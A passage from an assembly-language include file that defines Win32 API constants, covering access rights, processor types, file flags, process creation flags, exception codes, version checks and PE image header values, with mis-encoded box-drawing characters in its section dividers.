 MUTEX_ALL_ACCESS        EQU MUTANT_ALL_ACCESS

 TIMER_QUERY_STATE       EQU 0001h
 TIMER_MODIFY_STATE      EQU 0002h
 TIMER_ALL_ACCESS        EQU STANDARD_RIGHTS_REQUIRED OR SYNCHRONIZE OR\
                             TIMER_QUERY_STATE OR TIMER_MODIFY_STATE

;ƒƒƒƒƒƒ¥ PROCESSOR √ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ

 PROCESSOR_INTEL_386     EQU 386
 PROCESSOR_INTEL_486     EQU 486
 PROCESSOR_INTEL_PENTIUM EQU 586
 PROCESSOR_INTEL_IA64    EQU 2200
 PROCESSOR_MIPS_R4000    EQU 4000
 PROCESSOR_ALPHA_21064   EQU 21064
 PROCESSOR_PPC_601       EQU 601
 PROCESSOR_PPC_603       EQU 603
 PROCESSOR_PPC_604       EQU 604
 PROCESSOR_PPC_620       EQU 620
 PROCESSOR_HITACHI_SH3   EQU 10003   ; Windows CE
 PROCESSOR_HITACHI_SH3E  EQU 10004   ; Windows CE
 PROCESSOR_HITACHI_SH4   EQU 10005   ; Windows CE
 PROCESSOR_MOTOROLA_821  EQU 821     ; Windows CE
 PROCESSOR_SHx_SH3       EQU 103     ; Windows CE
 PROCESSOR_SHx_SH4       EQU 104     ; Windows CE
 PROCESSOR_STRONGARM     EQU 2577    ; Windows CE - A11
 PROCESSOR_ARM720        EQU 1824    ; Windows CE - 720
 PROCESSOR_ARM820        EQU 2080    ; Windows CE - 820
 PROCESSOR_ARM920        EQU 2336    ; Windows CE - 920
 PROCESSOR_ARM_7TDMI     EQU 70001   ; Windows CE

 PROCESSOR_ARCHITECTURE_INTEL   EQU 0
 PROCESSOR_ARCHITECTURE_MIPS    EQU 1
 PROCESSOR_ARCHITECTURE_ALPHA   EQU 2
 PROCESSOR_ARCHITECTURE_PPC     EQU 3
 PROCESSOR_ARCHITECTURE_SHX     EQU 4
 PROCESSOR_ARCHITECTURE_ARM     EQU 5
 PROCESSOR_ARCHITECTURE_IA64    EQU 6
 PROCESSOR_ARCHITECTURE_ALPHA64 EQU 7
 PROCESSOR_ARCHITECTURE_UNKNOWN EQU 0FFFFh

 PF_FLOATING_POINT_PRECISION_ERRATA  EQU 0
 PF_FLOATING_POINT_EMULATED          EQU 1
 PF_COMPARE_EXCHANGE_DOUBLE          EQU 2
 PF_MMX_INSTRUCTIONS_AVAILABLE       EQU 3
 PF_PPC_MOVEMEM_64BIT_OK             EQU 4
 PF_ALPHA_BYTE_INSTRUCTIONS          EQU 5
 PF_XMMI_INSTRUCTIONS_AVAILABLE      EQU 6
 PF_AMD3D_INSTRUCTIONS_AVAILABLE     EQU 7
 PF_RDTSC_INSTRUCTION_AVAILABLE      EQU 8
 SYSTEM_FLAG_REMOTE_BOOT_CLIENT      EQU 00000001h
 SYSTEM_FLAG_DISKLESS_CLIENT         EQU 00000002h

;ƒƒƒƒƒƒ¥ FILES √ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ

 INVALID_HANDLE_VALUE  EQU -1
 INVALID_FILE_SIZE     EQU 0FFFFFFFFh
 STD_INPUT_HANDLE      EQU -10
 STD_OUTPUT_HANDLE     EQU -11
 STD_ERROR_HANDLE      EQU -12

 FILE_BEGIN            EQU 0         ; used by SetFilePos (shows from where
 FILE_CURRENT          EQU 1         ; to move)
 FILE_END              EQU 2         ;

 FILE_READ_DATA        EQU 0001h     ; file & pipe
 FILE_LIST_DIRECTORY   EQU 0001h     ; directory

 FILE_WRITE_DATA       EQU 0002h     ; file & pipe
 FILE_ADD_FILE         EQU 0002h     ; directory

 FILE_APPEND_DATA            EQU 0004h      ; file
 FILE_ADD_SUBDIRECTORY       EQU 0004h      ; directory
 FILE_CREATE_PIPE_INSTANCE   EQU 0004h      ; named pipe
 FILE_READ_EA                EQU 0008h      ; file & directory
 FILE_WRITE_EA               EQU 0010h      ; file & directory
 FILE_EXECUTE                EQU 0020h      ; file
 FILE_TRAVERSE               EQU 0020h      ; directory
 FILE_DELETE_CHILD           EQU 0040h      ; directory
 FILE_READ_ATTRIBUTES        EQU 0080h      ; all
 FILE_WRITE_ATTRIBUTES       EQU 0100h      ; all
 FILE_ALL_ACCESS             EQU STANDARD_RIGHTS_REQUIRED OR\
                                 SYNCHRONIZE OR 1FFh

 FILE_GENERIC_READ           EQU STANDARD_RIGHTS_READ     OR\
                                 FILE_READ_DATA           OR\
                                 FILE_READ_ATTRIBUTES     OR\
                                 FILE_READ_EA             OR\
                                 SYNCHRONIZE


 FILE_GENERIC_WRITE          EQU STANDARD_RIGHTS_WRITE    OR\
                                 FILE_WRITE_DATA          OR\
                                 FILE_WRITE_ATTRIBUTES    OR\
                                 FILE_WRITE_EA            OR\
                                 FILE_APPEND_DATA         OR\
                                 SYNCHRONIZE


 FILE_GENERIC_EXECUTE        EQU STANDARD_RIGHTS_EXECUTE  OR\
                                 FILE_READ_ATTRIBUTES     OR\
                                 FILE_EXECUTE             OR\
                                 SYNCHRONIZE

 FILE_SHARE_READ                     EQU 00000001h
 FILE_SHARE_WRITE                    EQU 00000002h
 FILE_SHARE_DELETE                   EQU 00000004h

 FILE_ATTRIBUTE_READONLY             EQU 00000001h
 FILE_ATTRIBUTE_HIDDEN               EQU 00000002h
 FILE_ATTRIBUTE_SYSTEM               EQU 00000004h
 FILE_ATTRIBUTE_DIRECTORY            EQU 00000010h
 FILE_ATTRIBUTE_ARCHIVE              EQU 00000020h
 FILE_ATTRIBUTE_DEVICE               EQU 00000040h
 FILE_ATTRIBUTE_NORMAL               EQU 00000080h
 FILE_ATTRIBUTE_TEMPORARY            EQU 00000100h
 FILE_ATTRIBUTE_SPARSE_FILE          EQU 00000200h
 FILE_ATTRIBUTE_REPARSE_POINT        EQU 00000400h
 FILE_ATTRIBUTE_COMPRESSED           EQU 00000800h
 FILE_ATTRIBUTE_OFFLINE              EQU 00001000h
 FILE_ATTRIBUTE_NOT_CONTENT_INDEXED  EQU 00002000h
 FILE_ATTRIBUTE_ENCRYPTED            EQU 00004000h

 FILE_NOTIFY_CHANGE_FILE_NAME        EQU 00000001h
 FILE_NOTIFY_CHANGE_DIR_NAME         EQU 00000002h
 FILE_NOTIFY_CHANGE_ATTRIBUTES       EQU 00000004h
 FILE_NOTIFY_CHANGE_SIZE             EQU 00000008h
 FILE_NOTIFY_CHANGE_LAST_WRITE       EQU 00000010h
 FILE_NOTIFY_CHANGE_LAST_ACCESS      EQU 00000020h
 FILE_NOTIFY_CHANGE_CREATION         EQU 00000040h
 FILE_NOTIFY_CHANGE_SECURITY         EQU 00000100h

 FILE_ACTION_ADDED                   EQU 00000001h
 FILE_ACTION_REMOVED                 EQU 00000002h
 FILE_ACTION_MODIFIED                EQU 00000003h
 FILE_ACTION_RENAMED_OLD_NAME        EQU 00000004h
 FILE_ACTION_RENAMED_NEW_NAME        EQU 00000005h

 MAILSLOT_NO_MESSAGE                 EQU -1
 MAILSLOT_WAIT_FOREVER               EQU -1

 FILE_CASE_SENSITIVE_SEARCH          EQU 00000001h
 FILE_CASE_PRESERVED_NAMES           EQU 00000002h
 FILE_UNICODE_ON_DISK                EQU 00000004h
 FILE_PERSISTENT_ACLS                EQU 00000008h
 FILE_FILE_COMPRESSION               EQU 00000010h
 FILE_VOLUME_QUOTAS                  EQU 00000020h
 FILE_SUPPORTS_SPARSE_FILES          EQU 00000040h
 FILE_SUPPORTS_REPARSE_POINTS        EQU 00000080h
 FILE_SUPPORTS_REMOTE_STORAGE        EQU 00000100h
 FILE_VOLUME_IS_COMPRESSED           EQU 00008000h
 FILE_SUPPORTS_OBJECT_IDS            EQU 00010000h
 FILE_SUPPORTS_ENCRYPTION            EQU 00020000h

 COPY_FILE_FAIL_IF_EXISTS            EQU 00000001h
 COPY_FILE_RESTARTABLE               EQU 00000002h
 COPY_FILE_OPEN_SOURCE_FOR_WRITE     EQU 00000004h

 REPLACEFILE_WRITE_THROUGH           EQU 00000001h
 REPLACEFILE_IGNORE_MERGE_ERRORS     EQU 00000002h

 FILE_FLAG_WRITE_THROUGH         EQU 80000000h
 FILE_FLAG_OVERLAPPED            EQU 40000000h
 FILE_FLAG_NO_BUFFERING          EQU 20000000h
 FILE_FLAG_RANDOM_ACCESS         EQU 10000000h
 FILE_FLAG_SEQUENTIAL_SCAN       EQU 08000000h
 FILE_FLAG_DELETE_ON_CLOSE       EQU 04000000h
 FILE_FLAG_BACKUP_SEMANTICS      EQU 02000000h
 FILE_FLAG_POSIX_SEMANTICS       EQU 01000000h
 FILE_FLAG_OPEN_REPARSE_POINT    EQU 00200000h
 FILE_FLAG_OPEN_NO_RECALL        EQU 00100000h

 FIND_FIRST_EX_CASE_SENSITIVE    EQU 00000001h

 MOVEFILE_REPLACE_EXISTING       EQU 00000001h
 MOVEFILE_COPY_ALLOWED           EQU 00000002h
 MOVEFILE_DELAY_UNTIL_REBOOT     EQU 00000004h
 MOVEFILE_WRITE_THROUGH          EQU 00000008h
 MOVEFILE_CREATE_HARDLINK        EQU 00000010h
 MOVEFILE_FAIL_IF_NOT_TRACKABLE  EQU 00000020h

 CREATE_NEW                      EQU 1
 CREATE_ALWAYS                   EQU 2
 OPEN_EXISTING                   EQU 3
 OPEN_ALWAYS                     EQU 4
 TRUNCATE_EXISTING               EQU 5

 LOCKFILE_FAIL_IMMEDIATELY       EQU 00000001h
 LOCKFILE_EXCLUSIVE_LOCK         EQU 00000002h

 HANDLE_FLAG_INHERIT             EQU 00000001h
 HANDLE_FLAG_PROTECT_FROM_CLOSE  EQU 00000002h

 HINSTANCE_ERROR                 EQU 32

 FILE_ENCRYPTABLE                EQU 0
 FILE_IS_ENCRYPTED               EQU 1
 FILE_SYSTEM_ATTR                EQU 2
 FILE_ROOT_DIR                   EQU 3
 FILE_SYSTEM_DIR                 EQU 4
 FILE_UNKNOWN                    EQU 5
 FILE_SYSTEM_NOT_SUPPORT         EQU 6
 FILE_USER_DISALLOWED            EQU 7
 FILE_READ_ONLY                  EQU 8

 FS_CASE_IS_PRESERVED            EQU FILE_CASE_PRESERVED_NAMES
 FS_CASE_SENSITIVE               EQU FILE_CASE_SENSITIVE_SEARCH
 FS_UNICODE_STORED_ON_DISK       EQU FILE_UNICODE_ON_DISK
 FS_PERSISTENT_ACLS              EQU FILE_PERSISTENT_ACLS
 FS_VOL_IS_COMPRESSED            EQU FILE_VOLUME_IS_COMPRESSED
 FS_FILE_COMPRESSION             EQU FILE_FILE_COMPRESSION
 FS_FILE_ENCRYPTION              EQU FILE_SUPPORTS_ENCRYPTION

 FILE_MAP_COPY                   EQU SECTION_QUERY
 FILE_MAP_WRITE                  EQU SECTION_MAP_WRITE
 FILE_MAP_READ                   EQU SECTION_MAP_READ
 FILE_MAP_ALL_ACCESS             EQU SECTION_ALL_ACCESS

 ; Open File flags

 OF_READ                         EQU 00000000h
 OF_WRITE                        EQU 00000001h
 OF_READWRITE                    EQU 00000002h
 OF_SHARE_COMPAT                 EQU 00000000h
 OF_SHARE_EXCLUSIVE              EQU 00000010h
 OF_SHARE_DENY_WRITE             EQU 00000020h
 OF_SHARE_DENY_READ              EQU 00000030h
 OF_SHARE_DENY_NONE              EQU 00000040h
 OF_PARSE                        EQU 00000100h
 OF_DELETE                       EQU 00000200h
 OF_VERIFY                       EQU 00000400h
 OF_CANCEL                       EQU 00000800h
 OF_CREATE                       EQU 00001000h
 OF_PROMPT                       EQU 00002000h
 OF_EXIST                        EQU 00004000h
 OF_REOPEN                       EQU 00008000h

 FILE_TYPE_UNKNOWN               EQU 0000h
 FILE_TYPE_DISK                  EQU 0001h
 FILE_TYPE_CHAR                  EQU 0002h
 FILE_TYPE_PIPE                  EQU 0003h
 FILE_TYPE_REMOTE                EQU 8000h

;ƒƒƒƒƒƒ¥ PROCESS √ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ

 PROCESS_HEAP_REGION             EQU 0001h
 PROCESS_HEAP_UNCOMMITTED_RANGE  EQU 0002h
 PROCESS_HEAP_ENTRY_BUSY         EQU 0004h
 PROCESS_HEAP_ENTRY_MOVEABLE     EQU 0010h
 PROCESS_HEAP_ENTRY_DDESHARE     EQU 0020h

 DEBUG_PROCESS               EQU 00000001h
 DEBUG_ONLY_THIS_PROCESS     EQU 00000002h
 CREATE_SUSPENDED            EQU 00000004h
 DETACHED_PROCESS            EQU 00000008h
 CREATE_NEW_CONSOLE          EQU 00000010h

 NORMAL_PRIORITY_CLASS       EQU 00000020h
 IDLE_PRIORITY_CLASS         EQU 00000040h
 HIGH_PRIORITY_CLASS         EQU 00000080h
 REALTIME_PRIORITY_CLASS     EQU 00000100h

 CREATE_NEW_PROCESS_GROUP    EQU 00000200h
 CREATE_UNICODE_ENVIRONMENT  EQU 00000400h

 CREATE_SEPARATE_WOW_VDM     EQU 00000800h
 CREATE_SHARED_WOW_VDM       EQU 00001000h
 CREATE_FORCEDOS             EQU 00002000h

 BELOW_NORMAL_PRIORITY_CLASS EQU 00004000h
 ABOVE_NORMAL_PRIORITY_CLASS EQU 00008000h

 CREATE_DEFAULT_ERROR_MODE   EQU 04000000h
 CREATE_NO_WINDOW            EQU 08000000h

 PROFILE_USER                EQU 10000000h
 PROFILE_KERNEL              EQU 20000000h
 PROFILE_SERVER              EQU 40000000h

;ƒƒƒƒƒƒ¥ SEM √ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ

 SEM_FAILCRITICALERRORS      EQU 0001h
 SEM_NOGPFAULTERRORBOX       EQU 0002h
 SEM_NOALIGNMENTFAULTEXCEPT  EQU 0004h
 SEM_NOOPENFILEERRORBOX      EQU 8000h

;ƒƒƒƒƒƒ¥ MESSAGES √ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ

 FORMAT_MESSAGE_ALLOCATE_BUFFER EQU 00000100h
 FORMAT_MESSAGE_IGNORE_INSERTS  EQU 00000200h
 FORMAT_MESSAGE_FROM_STRING     EQU 00000400h
 FORMAT_MESSAGE_FROM_HMODULE    EQU 00000800h
 FORMAT_MESSAGE_FROM_SYSTEM     EQU 00001000h
 FORMAT_MESSAGE_ARGUMENT_ARRAY  EQU 00002000h
 FORMAT_MESSAGE_MAX_WIDTH_MASK  EQU 000000FFh

 MESSAGE_RESOURCE_UNICODE EQU 0001

;ƒƒƒƒƒƒ¥ EXCEPTIONS √ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ

 EXCEPTION_NONCONTINUABLE            EQU 1
 EXCEPTION_MAXIMUM_PARAMETERS        EQU 15

 EXCEPTION_ACCESS_VIOLATION          EQU STATUS_ACCESS_VIOLATION
 EXCEPTION_DATATYPE_MISALIGNMENT     EQU STATUS_DATATYPE_MISALIGNMENT
 EXCEPTION_BREAKPOINT                EQU STATUS_BREAKPOINT
 EXCEPTION_SINGLE_STEP               EQU STATUS_SINGLE_STEP
 EXCEPTION_ARRAY_BOUNDS_EXCEEDED     EQU STATUS_ARRAY_BOUNDS_EXCEEDED
 EXCEPTION_FLT_DENORMAL_OPERAND      EQU STATUS_FLOAT_DENORMAL_OPERAND
 EXCEPTION_FLT_DIVIDE_BY_ZERO        EQU STATUS_FLOAT_DIVIDE_BY_ZERO
 EXCEPTION_FLT_INEXACT_RESULT        EQU STATUS_FLOAT_INEXACT_RESULT
 EXCEPTION_FLT_INVALID_OPERATION     EQU STATUS_FLOAT_INVALID_OPERATION
 EXCEPTION_FLT_OVERFLOW              EQU STATUS_FLOAT_OVERFLOW
 EXCEPTION_FLT_STACK_CHECK           EQU STATUS_FLOAT_STACK_CHECK
 EXCEPTION_FLT_UNDERFLOW             EQU STATUS_FLOAT_UNDERFLOW
 EXCEPTION_INT_DIVIDE_BY_ZERO        EQU STATUS_INTEGER_DIVIDE_BY_ZERO
 EXCEPTION_INT_OVERFLOW              EQU STATUS_INTEGER_OVERFLOW
 EXCEPTION_PRIV_INSTRUCTION          EQU STATUS_PRIVILEGED_INSTRUCTION
 EXCEPTION_IN_PAGE_ERROR             EQU STATUS_IN_PAGE_ERROR
 EXCEPTION_ILLEGAL_INSTRUCTION       EQU STATUS_ILLEGAL_INSTRUCTION
 EXCEPTION_NONCONTINUABLE_EXCEPTION  EQU STATUS_NONCONTINUABLE_EXCEPTION
 EXCEPTION_STACK_OVERFLOW            EQU STATUS_STACK_OVERFLOW
 EXCEPTION_INVALID_DISPOSITION       EQU STATUS_INVALID_DISPOSITION
 EXCEPTION_GUARD_PAGE                EQU STATUS_GUARD_PAGE_VIOLATION
 EXCEPTION_INVALID_HANDLE            EQU STATUS_INVALID_HANDLE

;ƒƒƒƒƒƒ¥ VERSION √ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ

 VER_SERVER_NT                       EQU 80000000h
 VER_WORKSTATION_NT                  EQU 40000000h
 VER_SUITE_SMALLBUSINESS             EQU 00000001h
 VER_SUITE_ENTERPRISE                EQU 00000002h
 VER_SUITE_BACKOFFICE                EQU 00000004h
 VER_SUITE_COMMUNICATIONS            EQU 00000008h
 VER_SUITE_TERMINAL                  EQU 00000010h
 VER_SUITE_SMALLBUSINESS_RESTRICTED  EQU 00000020h
 VER_SUITE_EMBEDDEDNT                EQU 00000040h

 VER_PLATFORM_WIN32s                 EQU 0
 VER_PLATFORM_WIN32_WINDOWS          EQU 1
 VER_PLATFORM_WIN32_NT               EQU 2

 VER_EQUAL                           EQU 1
 VER_GREATER                         EQU 2
 VER_GREATER_EQUAL                   EQU 3
 VER_LESS                            EQU 4
 VER_LESS_EQUAL                      EQU 5
 VER_AND                             EQU 6
 VER_OR                              EQU 7

 VER_MINORVERSION                    EQU 0000001h
 VER_MAJORVERSION                    EQU 0000002h
 VER_BUILDNUMBER                     EQU 0000004h
 VER_PLATFORMID                      EQU 0000008h
 VER_SERVICEPACKMINOR                EQU 0000010h
 VER_SERVICEPACKMAJOR                EQU 0000020h
 VER_SUITENAME                       EQU 0000040h

;ƒƒƒƒƒƒ¥ FILE IMAGES EQUATES √ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ

 IMAGE_DOS_SIGNATURE                  EQU 5A4Dh      ; MZ
 IMAGE_OS2_SIGNATURE                  EQU 454Eh      ; NE
 IMAGE_OS2_SIGNATURE_LE               EQU 454Ch      ; LE
 IMAGE_VXD_SIGNATURE                  EQU 454Ch      ; LE
 IMAGE_NT_SIGNATURE                   EQU 00004550h  ; PE00
 IMAGE_SIZEOF_FILE_HEADER             EQU 20     ;
 IMAGE_SIZEOF_MZ_HEADER               EQU 40h    ;

 ; PE File Characteristics

 IMAGE_FILE_RELOCS_STRIPPED           EQU 0001h  ; Relocation info stripped from file.
 IMAGE_FILE_EXECUTABLE_IMAGE          EQU 0002h  ; File is executable  (i.e. no unresolved externel references).
 IMAGE_FILE_LINE_NUMS_STRIPPED        EQU 0004h  ; Line nunbers stripped from file.
 IMAGE_FILE_LOCAL_SYMS_STRIPPED       EQU 0008h  ; Local symbols stripped from file.
 IMAGE_FILE_AGGRESIVE_WS_TRIM         EQU 0010h  ; Agressively trim working set
 IMAGE_FILE_LARGE_ADDRESS_AWARE       EQU 0020h  ; App can handle >2gb addresses
 IMAGE_FILE_BYTES_REVERSED_LO         EQU 0080h  ; Bytes of machine word are reversed.
 IMAGE_FILE_32BIT_MACHINE             EQU 0100h  ; 32 bit word machine.
 IMAGE_FILE_DEBUG_STRIPPED            EQU 0200h  ; Debugging info stripped from file in .DBG file
 IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP   EQU 0400h  ; If Image is on removable media, copy and run from the swap file.
 IMAGE_FILE_NET_RUN_FROM_SWAP         EQU 0800h  ; If Image is on Net, copy and run from the swap file.
 IMAGE_FILE_SYSTEM                    EQU 1000h  ; System File.
 IMAGE_FILE_DLL                       EQU 2000h  ; File is a DLL.
 IMAGE_FILE_UP_SYSTEM_ONLY            EQU 4000h  ; File should only be run on a UP machine
 IMAGE_FILE_BYTES_REVERSED_HI         EQU 8000h  ; Bytes of machine word are reversed.

 ; PE Machine type

 IMAGE_FILE_MACHINE_UNKNOWN           EQU 0
 IMAGE_FILE_MACHINE_I386              EQU 014ch  ; Intel 386.
 IMAGE_FILE_MACHINE_R3000             EQU 0162h  ; MIPS little-endian, 160 big-endian
 IMAGE_FILE_MACHINE_R4000             EQU 0166h  ; MIPS little-endian
 IMAGE_FILE_MACHINE_R10000            EQU 0168h  ; MIPS little-endian
 IMAGE_FILE_MACHINE_WCEMIPSV2         EQU 0169h  ; MIPS little-endian WCE v2
 IMAGE_FILE_MACHINE_ALPHA             EQU 0184h  ; Alpha_AXP
 IMAGE_FILE_MACHINE_POWERPC           EQU 01F0h  ; IBM PowerPC Little-Endian
 IMAGE_FILE_MACHINE_SH3               EQU 01a2h  ; SH3 little-endian
 IMAGE_FILE_MACHINE_SH3E              EQU 01a4h  ; SH3E little-endian
 IMAGE_FILE_MACHINE_SH4               EQU 01a6h  ; SH4 little-endian
 IMAGE_FILE_MACHINE_ARM               EQU 01c0h  ; ARM Little-Endian
 IMAGE_FILE_MACHINE_THUMB             EQU 01c2h
 IMAGE_FILE_MACHINE_IA64              EQU 0200h  ; Intel 64
 IMAGE_FILE_MACHINE_MIPS16            EQU 0266h  ; MIPS
 IMAGE_FILE_MACHINE_MIPSFPU           EQU 0366h  ; MIPS
 IMAGE_FILE_MACHINE_MIPSFPU16         EQU 0466h  ; MIPS
 IMAGE_FILE_MACHINE_ALPHA64           EQU 0284h  ; ALPHA64
 IMAGE_FILE_MACHINE_AXP64             EQU IMAGE_FILE_MACHINE_ALPHA64

 IMAGE_NUMBEROF_DIRECTORY_ENTRIES     EQU 16
 IMAGE_SIZEOF_STD_OPTIONAL_HEADER     EQU 28
 IMAGE_SIZEOF_NT_OPTIONAL_HEADER      EQU 224
 IMAGE_NT_OPTIONAL_HDR_MAGIC          EQU 10bh

 IMAGE_SUBSYSTEM_UNKNOWN              EQU 0   ; Unknown subsystem.
 IMAGE_SUBSYSTEM_NATIVE               EQU 1   ; Image doesn't require a subsystem.
 IMAGE_SUBSYSTEM_WINDOWS_GUI          EQU 2   ; Image runs in the Windows GUI subsystem.
 IMAGE_SUBSYSTEM_WINDOWS_CUI          EQU 3   ; Image runs in the Windows character subsystem.
 IMAGE_SUBSYSTEM_OS2_CUI              EQU 5   ; image runs in the OS/2 character subsystem.
 IMAGE_SUBSYSTEM_POSIX_CUI            EQU 7   ; image runs in the Posix character subsystem.
 IMAGE_SUBSYSTEM_NATIVE_WINDOWS       EQU 8   ; image is a native Win9x driver.
 IMAGE_SUBSYSTEM_WINDOWS_CE_GUI       EQU 9   ; Image runs in the Windows CE subsystem.

 ; Directory Entries

 IMAGE_DIRECTORY_ENTRY_EXPORT         EQU 0    ; Export Directory
 IMAGE_DIRECTORY_ENTRY_IMPORT         EQU 1    ; Import Directory
 IMAGE_DIRECTORY_ENTRY_RESOURCE       EQU 2    ; Resource Directory
 IMAGE_DIRECTORY_ENTRY_EXCEPTION      EQU 3    ; Exception Directory
 IMAGE_DIRECTORY_ENTRY_SECURITY       EQU 4    ; Security Directory
 IMAGE_DIRECTORY_ENTRY_BASERELOC      EQU 5    ; Base Relocation Table
 IMAGE_DIRECTORY_ENTRY_DEBUG          EQU 6    ; Debug Directory
 IMAGE_DIRECTORY_ENTRY_ARCHITECTURE   EQU 7    ; Architecture Specific Data
 IMAGE_DIRECTORY_ENTRY_GLOBALPTR      EQU 8    ; RVA of GP
 IMAGE_DIRECTORY_ENTRY_TLS            EQU 9    ; TLS Directory
 IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG    EQU 10   ; Load Configuration Directory
 IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT   EQU 11   ; Bound Import Directory in headers
 IMAGE_DIRECTORY_ENTRY_IAT            EQU 12   ; Import Address Table
 IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT   EQU 13   ; Delay Load Import Descriptors
 IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR EQU 14   ; COM Runtime descriptor

 IMAGE_SIZEOF_SHORT_NAME              EQU 8
 IMAGE_SIZEOF_SECTION_HEADER          EQU 40

 ; Section Characteristics

 IMAGE_SCN_CNT_CODE                   EQU 00000020h  ; Section contains code.
 IMAGE_SCN_CNT_INITIALIZED_DATA       EQU 00000040h  ; Section contains initialized data.
 IMAGE_SCN_CNT_UNINITIALIZED_DATA     EQU 00000080h  ; Section contains uninitialized data.

 IMAGE_SCN_LNK_INFO                   EQU 00000200h  ; Section contains comments or some other type of information.
 IMAGE_SCN_LNK_REMOVE                 EQU 00000800h  ; Section contents will not become part of image.
 IMAGE_SCN_LNK_COMDAT                 EQU 00001000h  ; Section contents comdat.
 IMAGE_SCN_NO_DEFER_SPEC_EXC          EQU 00004000h  ; Reset speculative exceptions handling bits in the TLB entries for this section.
 IMAGE_SCN_GPREL                      EQU 00008000h  ; Section content can be accessed relative to GP
 IMAGE_SCN_MEM_FARDATA                EQU 00008000h
 IMAGE_SCN_MEM_PURGEABLE              EQU 00020000h
 IMAGE_SCN_MEM_16BIT                  EQU 00020000h
 IMAGE_SCN_MEM_LOCKED                 EQU 00040000h
 IMAGE_SCN_MEM_PRELOAD                EQU 00080000h

 IMAGE_SCN_ALIGN_1BYTES               EQU 00100000h  ;
 IMAGE_SCN_ALIGN_2BYTES               EQU 00200000h  ;
 IMAGE_SCN_ALIGN_4BYTES               EQU 00300000h  ;
 IMAGE_SCN_ALIGN_8BYTES               EQU 00400000h  ;
 IMAGE_SCN_ALIGN_16BYTES              EQU 00500000h  ; Default alignment if no others are specified.
 IMAGE_SCN_ALIGN_32BYTES              EQU 00600000h  ;
 IMAGE_SCN_ALIGN_64BYTES              EQU 00700000h  ;
 IMAGE_SCN_ALIGN_128BYTES             EQU 00800000h  ;
 IMAGE_SCN_ALIGN_256BYTES             EQU 00900000h  ;
 IMAGE_SCN_ALIGN_512BYTES             EQU 00A00000h  ;
 IMAGE_SCN_ALIGN_1024BYTES            EQU 00B00000h  ;
 IMAGE_SCN_ALIGN_2048BYTES            EQU 00C00000h  ;
 IMAGE_SCN_ALIGN_4096BYTES            EQU 00D00000h  ;
 IMAGE_SCN_ALIGN_8192BYTES            EQU 00E00000h  ;
 IMAGE_SCN_ALIGN_MASK                 EQU 00F00000h

 IMAGE_SCN_LNK_NRELOC_OVFL            EQU 01000000h  ; Section contains extended relocations.
 IMAGE_SCN_MEM_DISCARDABLE            EQU 02000000h  ; Section can be discarded.
 IMAGE_SCN_MEM_NOT_CACHED             EQU 04000000h  ; Section is not cachable.
 IMAGE_SCN_MEM_NOT_PAGED              EQU 08000000h  ; Section is not pageable.
 IMAGE_SCN_MEM_SHARED                 EQU 10000000h  ; Section is shareable.
 IMAGE_SCN_MEM_EXECUTE                EQU 20000000h  ; Section is executable.
 IMAGE_SCN_MEM_READ                   EQU 40000000h  ; Section is readable.
 IMAGE_SCN_MEM_WRITE                  EQU 80000000h  ; Section is writeable.

 IMAGE_SCN_SCALE_INDEX                EQU 00000001h  ; Tls index is scaled

 IMAGE_SIZEOF_SYMBOL                  EQU 18

 IMAGE_SYM_UNDEFINED                  EQU 0          ; Symbol is undefined or is common.
 IMAGE_SYM_ABSOLUTE                   EQU -1         ; Symbol is an absolute value.
 IMAGE_SYM_DEBUG                      EQU -2         ; Symbol is a special debug item.

 IMAGE_SYM_TYPE_NULL                  EQU 0000h  ; no type.
 IMAGE_SYM_TYPE_VOID                  EQU 0001h  ;
 IMAGE_SYM_TYPE_CHAR                  EQU 0002h  ; type character.
 IMAGE_SYM_TYPE_SHORT                 EQU 0003h  ; type short integer.
 IMAGE_SYM_TYPE_INT                   EQU 0004h  ;
 IMAGE_SYM_TYPE_LONG                  EQU 0005h  ;
 IMAGE_SYM_TYPE_FLOAT                 EQU 0006h  ;
 IMAGE_SYM_TYPE_DOUBLE                EQU 0007h  ;
 IMAGE_SYM_TYPE_STRUCT                EQU 0008h  ;
 IMAGE_SYM_TYPE_UNION                 EQU 0009h  ;
 IMAGE_SYM_TYPE_ENUM                  EQU 000Ah  ; enumeration.
